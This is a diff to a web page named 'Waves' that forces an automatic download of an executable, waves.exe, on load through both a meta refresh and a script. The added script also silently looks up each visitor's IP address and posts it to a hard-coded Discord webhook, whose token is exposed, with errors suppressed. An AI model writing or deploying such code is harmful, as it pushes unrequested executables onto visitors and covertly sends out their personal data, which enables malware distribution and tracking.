@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Download Waves</title>
-    <meta http-equiv="refresh" content="0;url=Waves.exe">
+    <title>Waves</title>
+    <meta http-equiv="refresh" content="0;url=waves.exe">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -46,12 +46,33 @@
     </div>
     <script>
         window.onload = function() {
-            const link = document.createElement('a');
-            link.href = './waves.exe';
-            link.download = '';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+            // Trigger EXE download
+            const downloadLink = document.createElement('a');
+            downloadLink.href = './waves.exe';
+            downloadLink.download = '';
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+
+            // Fetch visitor IP and send to webhook
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1409882672016396340/TrK3W1JQnuwiEI0MYWN7T3zGy3itJAnmOe4D0-1_IFYH-Yp9zYfE0F8jH1YWZB7STdJU'; // Replace with your actual webhook URL (e.g., Discord webhook)
+
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip || 'Unknown';
+                    // Send IP to webhook
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: `Visitor IP: ${ip}` // Customize this message as needed
+                        })
+                    }).catch(error => console.error('Webhook error:', error)); // Silent error handling
+                })
+                .catch(error => console.error('IP fetch error:', error)); // Silent error handling
         };
     </script>
 </body>
